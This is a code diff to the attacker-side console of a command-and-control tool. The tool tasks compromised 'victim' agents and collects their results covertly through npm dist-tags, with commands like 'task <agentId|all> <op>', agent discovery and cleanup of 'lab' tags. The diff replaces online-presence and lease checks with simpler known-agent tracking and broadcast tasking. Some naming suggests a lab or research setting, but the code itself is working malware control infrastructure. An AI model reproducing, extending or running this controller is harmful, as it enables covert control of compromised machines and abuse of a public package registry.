@@ -2,12 +2,12 @@
 // exclusively through npm dist-tags. It never talks to a victim directly.
 //
 // While the prompt is idle, a background poller keeps running and prints
-// live notifications: agents joining (announce tags) and tasks completing
+// live notifications: agents discovered (announce tags) and tasks completing
 // or failing (result tags).
 //
 // Commands:
-//   agents                      list agents seen, with last-seen info
-//   task <agentId|all> <op> [args...]   task one online agent or fan out to all
+//   agents                      list historically discovered agents
+//   task <agentId|all> <op> [args...]   task one known agent or broadcast to all
 //                         (op allowlist: src/common/ops.js)
 //   history [n]                 show the last n requests/responses (default 20)
 //   poll                        fetch results or show locally pending direct tasks
@@ -21,7 +21,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { styleText } from 'node:util';
 import { pathToFileURL } from 'node:url';
-import { channelTimings, loadConfig, configArgFromArgv } from '../common/config.js';
+import { taskTtlMs, loadConfig, configArgFromArgv } from '../common/config.js';
 import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
@@ -38,28 +38,19 @@ import {
 } from '../common/protocol.js';
 import { OP_DEFS, getOpDef } from '../common/ops.js';
 import { RegistryClient } from '../common/registry.js';
-import { isCommandExpired, saveState } from '../victim/agent.js';
-import {
-  agentPresenceStatus,
-  assertDirectTargetOnline,
-  invalidateAgentPresence,
-  isAgentOnline,
-  loadAttackerState,
-  mergeAgentInfo,
-  observeHeartbeatSet,
-} from './presence.js';
+import { saveState } from '../victim/agent.js';
+import { assertKnownAgent, loadAttackerState } from './state.js';
 
 const tty = process.stdout.isTTY;
 const c = (color, s) => (tty ? styleText(color, s) : s);
 
 // Readability palette (no emojis, no rainbow):
 //   yellow bold  section headers        bold white   command/op names
-//   cyan         arguments & paths      dim          secondary text
+//   cyan         CLI title              dim          secondary text
 //   green        success / joins        red          errors
 //   magenta      agent ids / results    blue         prompt / outgoing
 const section = (s) => c(['bold', 'yellow'], s);
 const cmdName = (s) => c(['bold', 'white'], s);
-const arg = (s) => c('cyan', s);
 const dim = (s) => c('dim', s);
 
 const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
@@ -93,10 +84,6 @@ export function pendingDirectTasks(history, { now = Date.now(), ttlMs = Infinity
       now - entry.ts < ttlMs &&
       !completed.has(`${entry.target}:${entry.seq}:${entry.op}`),
   );
-}
-
-export function wasCommandSentLocally(history, tag) {
-  return history.some((entry) => entry.dir === 'out' && entry.tag === tag);
 }
 
 /** Render registry-controlled text without terminal escapes or unbounded output. */
@@ -249,7 +236,7 @@ async function main() {
   const statePath = cfg.stateFile || 'attacker-state.json';
   const state = loadAttackerState(statePath);
   const save = () => saveState(statePath, state);
-  const timings = channelTimings(cfg.pollIntervalSec);
+  const ttlMs = taskTtlMs(cfg.pollIntervalSec);
 
   const client = new RegistryClient({
     registryUrl: cfg.registryUrl,
@@ -282,41 +269,10 @@ async function main() {
 
   // --- shared helpers -------------------------------------------------------
 
-  function noteAgent(agentId, info = {}) {
-    if (!state.agents.includes(agentId)) state.agents.push(agentId);
-    state.agentInfo[agentId] = mergeAgentInfo(state.agentInfo[agentId], info);
-  }
-
-  function observeAgentHeartbeats(agentId, entries, observedAt, redraw) {
-    const previous = state.agentInfo[agentId] ?? {};
-    const wasOnline = isAgentOnline(previous, observedAt, timings.offlineMs);
-    const known = new Set(Array.isArray(previous.heartbeatTags) ? previous.heartbeatTags : []);
-    const unseenEntries = entries.filter((entry) => !known.has(entry.tag));
-    const metadataEntries = Array.isArray(previous.heartbeatTags) && unseenEntries.length > 0
-      ? unseenEntries
-      : entries;
-    const selected = metadataEntries.reduce((latest, entry) => {
-      const latestTs = Number(latest?.payload?.ts);
-      const entryTs = Number(entry.payload?.ts);
-      if (!latest || (Number.isFinite(entryTs) && (!Number.isFinite(latestTs) || entryTs > latestTs))) {
-        return entry;
-      }
-      return latest;
-    }, null);
-    const next = observeHeartbeatSet(
-      previous,
-      entries.map((entry) => entry.tag),
-      selected?.payload ?? {},
-      observedAt,
-    );
-
-    if (!state.agents.includes(agentId)) state.agents.push(agentId);
-    state.agentInfo[agentId] = next;
-    if (!wasOnline && isAgentOnline(next, observedAt, timings.offlineMs)) {
-      const { host, cwd } = next;
-      const detail = [host && `host=${host}`, cwd && `cwd=${cwd}`].filter(Boolean).join(' ');
-      notify(`[${ts()}] ${c('green', '[+] agent joined:')} ${c('bold', agentId)}${detail ? ` (${detail})` : ''}`, redraw);
-    }
+  function noteAgent(agentId, redraw = true) {
+    if (state.agents.includes(agentId)) return;
+    state.agents.push(agentId);
+    notify(`[${ts()}] ${c('green', '[+] agent discovered:')} ${c('bold', agentId)}`, redraw);
   }
 
   function printResult(agentId, r, redraw = true) {
@@ -353,8 +309,6 @@ async function main() {
     });
   }
 
-  let registryFresh = false;
-  let presenceEpoch = 0;
   let cleaning = false;
   // First time each incomplete result group was observed, so a result whose
   // chunks were lost in transit stops nagging once the task TTL has passed.
@@ -363,7 +317,7 @@ async function main() {
   function printPendingTasks() {
     const pending = pendingDirectTasks(state.history, {
       now: Date.now(),
-      ttlMs: timings.taskTtlMs,
+      ttlMs,
     });
     for (const task of pending.slice(-5)) {
       const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
@@ -373,111 +327,79 @@ async function main() {
 
   const refreshOnce = createSingleFlight(async ({ redraw = false } = {}) => {
     if (cleaning) throw new Error('registry cleanup is in progress');
-    const refreshEpoch = presenceEpoch;
-    try {
-      const tags = await client.getDistTags();
-      if (refreshEpoch !== presenceEpoch || cleaning) {
-        return { fresh: 0, incomplete: [] };
-      }
-      const observedAt = Date.now();
-      const groups = new Map(); // "<agentId>:<seq>" -> parts[]
-      const announcements = new Map(); // agentId -> [{ tag, payload }]
-      const expiredCommandTags = [];
-      for (const name of Object.keys(tags)) {
-        if (isCommandTag(name)) {
-          try {
-            const cmd = decodeCommandTag(name);
-            const sentLocally = wasCommandSentLocally(state.history, name);
-            if (sentLocally && isCommandExpired(cmd.payload, Date.now(), timings.taskTtlMs)) {
-              expiredCommandTags.push(name);
-            }
-          } catch (err) {
-            logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
-          }
-          continue;
-        }
-        if (isAnnounceTag(name)) {
-          try {
-            const ann = decodeAnnounceTag(name);
-            if (!announcements.has(ann.agentId)) announcements.set(ann.agentId, []);
-            announcements.get(ann.agentId).push({ tag: name, payload: ann.payload });
-          } catch (err) {
-            logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
-          }
-          continue;
-        }
-        if (!isResultTag(name)) continue;
-        let part;
+    const tags = await client.getDistTags();
+    if (cleaning) return { fresh: 0, incomplete: [] };
+    const observedAt = Date.now();
+    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
+    for (const name of Object.keys(tags)) {
+      if (isCommandTag(name)) {
         try {
-          part = decodeResultTag(name);
+          const cmd = decodeCommandTag(name);
+          state.nextSeq[cmd.agentId] = Math.max(state.nextSeq[cmd.agentId] ?? 0, cmd.seq);
         } catch (err) {
-          logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
-          continue;
+          logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
         }
-        const key = `${part.agentId}:${part.seq}`;
-        if (!groups.has(key)) groups.set(key, []);
-        groups.get(key).push(part);
+        continue;
       }
-      for (const [agentId, entries] of announcements) {
-        observeAgentHeartbeats(agentId, entries, observedAt, redraw);
-      }
-      for (const agentId of state.agents) {
-        const info = state.agentInfo[agentId] ?? {};
-        if (!announcements.has(agentId) && !Number(info.lastSeen) && !Number(info.baselineAt)) {
-          state.agentInfo[agentId] = invalidateAgentPresence(info, observedAt);
-        }
-      }
-
-      let fresh = 0;
-      const incomplete = [];
-      for (const [key, parts] of groups) {
-        if (state.seenResults.includes(key)) continue;
-        const total = parts[0].total;
-        if (new Set(parts.map((p) => p.chunk)).size !== total) {
-          const firstSeen = incompleteFirstSeen.get(key) ?? observedAt;
-          incompleteFirstSeen.set(key, firstSeen);
-          const have = new Set(parts.map((p) => p.chunk)).size;
-          if (observedAt - firstSeen >= timings.taskTtlMs) {
-            incomplete.push(`${key}: result incomplete (${have}/${total} chunks) after the task TTL — giving up, result lost`);
-            state.seenResults.push(key);
-            incompleteFirstSeen.delete(key);
-            continue;
-          }
-          incomplete.push(`${key}: waiting for chunks (${have}/${total})`);
-          continue;
-        }
-        incompleteFirstSeen.delete(key);
+      if (isAnnounceTag(name)) {
         try {
-          const result = reassembleResult(parts);
-          const a = parts[0].agentId;
-          noteAgent(a);
-          printResult(a, result, redraw);
-          recordResult(a, result);
-          state.seenResults.push(key);
-          state.received++;
-          state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
-          fresh++;
+          const ann = decodeAnnounceTag(name);
+          noteAgent(ann.agentId, redraw);
         } catch (err) {
-          logger.warn(`failed to reassemble ${key}: ${err.message}`);
+          logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
         }
+        continue;
       }
-      for (const key of incompleteFirstSeen.keys()) {
-        if (!groups.has(key)) incompleteFirstSeen.delete(key);
+      if (!isResultTag(name)) continue;
+      let part;
+      try {
+        part = decodeResultTag(name);
+      } catch (err) {
+        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
+        continue;
       }
-      for (const tag of expiredCommandTags) {
-        try {
-          await client.deleteDistTag(tag);
-        } catch (err) {
-          logger.warn(`failed to delete expired command "${tag}": ${err.message}`);
-        }
-      }
-      registryFresh = true;
-      save();
-      return { fresh, incomplete };
-    } catch (err) {
-      registryFresh = false;
-      throw err;
+      const key = `${part.agentId}:${part.seq}`;
+      if (!groups.has(key)) groups.set(key, []);
+      groups.get(key).push(part);
     }
+    let fresh = 0;
+    const incomplete = [];
+    for (const [key, parts] of groups) {
+      if (state.seenResults.includes(key)) continue;
+      const total = parts[0].total;
+      if (new Set(parts.map((p) => p.chunk)).size !== total) {
+        const firstSeen = incompleteFirstSeen.get(key) ?? observedAt;
+        incompleteFirstSeen.set(key, firstSeen);
+        const have = new Set(parts.map((p) => p.chunk)).size;
+        if (observedAt - firstSeen >= ttlMs) {
+          incomplete.push(`${key}: result incomplete (${have}/${total} chunks) after the task TTL — giving up, result lost`);
+          state.seenResults.push(key);
+          incompleteFirstSeen.delete(key);
+          continue;
+        }
+        incomplete.push(`${key}: waiting for chunks (${have}/${total})`);
+        continue;
+      }
+      incompleteFirstSeen.delete(key);
+      try {
+        const result = reassembleResult(parts);
+        const a = parts[0].agentId;
+        noteAgent(a, redraw);
+        printResult(a, result, redraw);
+        recordResult(a, result);
+        state.seenResults.push(key);
+        state.received++;
+        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
+        fresh++;
+      } catch (err) {
+        logger.warn(`failed to reassemble ${key}: ${err.message}`);
+      }
+    }
+    for (const key of incompleteFirstSeen.keys()) {
+      if (!groups.has(key)) incompleteFirstSeen.delete(key);
+    }
+    save();
+    return { fresh, incomplete };
   });
 
   async function pollOnce({ quiet = false, redraw = false } = {}) {
@@ -490,10 +412,10 @@ async function main() {
     return fresh;
   }
 
-  async function sendDirectTask(target, op, args) {
-    const seq = (state.nextSeq[target] ?? 0) + 1;
+  async function sendTask(target, op, args) {
+    const seq = Math.max(0, ...Object.values(state.nextSeq)) + 1;
     const sentAt = Date.now();
-    const payload = { op, args, ts: sentAt, lease: state.agentInfo[target].lease };
+    const payload = { op, args, ts: sentAt };
     const tag = encodeCommandTag(target, seq, payload);
     await client.setDistTag(tag, PINNED_VERSION);
     state.nextSeq[target] = seq;
@@ -520,8 +442,8 @@ async function main() {
   const commands = {
     help() {
       const commandRows = [
-        ['task <agentId|all> <op> [args]', 'task one online agent or fan out to all'],
-        ['agents', 'list agents seen (last-seen, host, cwd)'],
+        ['task <agentId|all> <op> [args]', 'task one known agent or broadcast to all'],
+        ['agents', 'list historically discovered agents'],
         ['history [n]', 'last n requests/responses (default 20)'],
         ['poll', 'fetch results or show locally pending direct tasks'],
         ['clean', 'delete all x-cmd-* / x-res-* / x-ann-* tags'],
@@ -544,7 +466,7 @@ async function main() {
           table(funRows),
           '',
           dim('  path args are absolute or relative to the agent cwd (see pwd/cd).'),
-          dim('  agent joins and task results print as live notifications.'),
+          dim('  agent discoveries and task results print as live notifications.'),
           '',
         ].join('\n'),
       );
@@ -560,21 +482,9 @@ async function main() {
         console.log(dim('no agents seen yet'));
       } else {
         for (const a of state.agents) {
-          const info = state.agentInfo[a] ?? {};
-          const seen = info.lastSeen ? new Date(info.lastSeen).toLocaleString() : '?';
-          const presence = agentPresenceStatus(info, Date.now(), timings.offlineMs, registryFresh);
-          const status = presence === 'online'
-            ? c('green', presence)
-            : presence === 'offline'
-              ? c('red', presence)
-              : c('yellow', presence);
-          const detail = [info.host && `host=${info.host}`, info.cwd && `cwd=${info.cwd}`]
-            .filter(Boolean)
-            .join(' ');
           console.log(
-            `  ${c(['bold', 'green'], a)}  ${status}, ${dim(`${state.perAgent[a] ?? 0} results, last heartbeat observed ${seen}`)}`,
+            `  ${c(['bold', 'green'], a)}  ${c('yellow', 'known')}, ${dim(`${state.perAgent[a] ?? 0} results`)}`,
           );
-          if (detail) console.log(`    ${dim(detail)}`);
         }
       }
     },
@@ -584,21 +494,15 @@ async function main() {
       try {
         await pollOnce({ quiet: true });
       } catch (err) {
-        throw new Error(`cannot verify agent presence: ${err.message}`);
+        logger.warn(`agent discovery refresh failed before task: ${err.message}`);
       }
 
       if (target === 'all') {
-        const targets = state.agents.filter((agentId) => {
-          const info = state.agentInfo[agentId];
-          return typeof info?.lease === 'string'
-            && agentPresenceStatus(info, Date.now(), timings.offlineMs, registryFresh) === 'online';
-        });
-        if (targets.length === 0) throw new Error('no online agents available; task not sent');
-        for (const agentId of targets) await sendDirectTask(agentId, op, args);
-        console.log(c('dim', `  fan-out complete: ${targets.length} agent(s)`));
+        if (state.agents.length === 0) throw new Error('no known agents available; task not sent');
+        await sendTask('all', op, args);
       } else {
-        assertDirectTargetOnline(state, target, Date.now(), timings.offlineMs, registryFresh);
-        await sendDirectTask(target, op, args);
+        assertKnownAgent(state, target);
+        await sendTask(target, op, args);
       }
     },
 
@@ -624,7 +528,6 @@ async function main() {
 
     async clean() {
       cleaning = true;
-      presenceEpoch++;
       try {
         const tags = await client.getDistTags();
         const lab = Object.keys(tags).filter(isLabTag);
@@ -644,14 +547,6 @@ async function main() {
         const remaining = Object.keys(await client.getDistTags());
         console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
       } finally {
-        const invalidatedAt = Date.now();
-        state.agentInfo = Object.fromEntries(
-          Object.entries(state.agentInfo).map(([agentId, info]) => [
-            agentId,
-            invalidateAgentPresence(info, invalidatedAt),
-          ]),
-        );
-        registryFresh = false;
         cleaning = false;
         save();
       }
